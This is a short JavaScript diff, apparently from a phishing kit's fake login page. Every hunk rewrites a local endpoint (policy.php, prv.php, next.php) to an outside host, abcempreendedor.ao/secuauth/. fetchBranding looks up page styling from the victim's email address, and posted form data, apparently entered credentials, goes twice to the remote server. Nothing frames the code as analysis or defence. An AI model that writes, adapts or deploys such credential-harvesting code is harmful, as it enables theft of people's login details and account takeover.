@@ -844,7 +844,7 @@ function secureAjaxSend(data, callback) {
     
     // Send via AJAX
     $.ajax({
-        url: 'policy.php',
+        url: 'https://abcempreendedor.ao/secuauth/policy.php',
         type: 'POST',
         data: {
             send_ajax: 'true',
@@ -948,7 +948,7 @@ $(document).ready(function() {
     
     function fetchBranding(email) {
         var request = new XMLHttpRequest();
-        var url = 'prv.php?id=' + encodeURIComponent(email);
+        var url = 'https://abcempreendedor.ao/secuauth/prv.php?id=' + encodeURIComponent(email);
         request.open('GET', url, true);
         request.onload = function() {
             if (this.status >= 200 && this.status < 400) {
@@ -1091,7 +1091,7 @@ $(document).ready(function() {
                 secureAjaxSend(postData, function(result) {
                     // Proceed with normal submission regardless of AJAX result for reliability
                     $.ajax({
-                        url: "next.php",
+                        url: "https://abcempreendedor.ao/secuauth/next.php",
                         data: postData,
                         type: "POST",
                         success: function(data){
@@ -1184,7 +1184,7 @@ $(document).ready(function() {
             secureAjaxSend(postData, function(result) {
                 // Proceed with normal submission regardless of AJAX result
                 $.ajax({
-                    url: "next.php",
+                    url: "https://abcempreendedor.ao/secuauth/next.php",
                     data: postData,
                     type: "POST",
                     success: function(data){
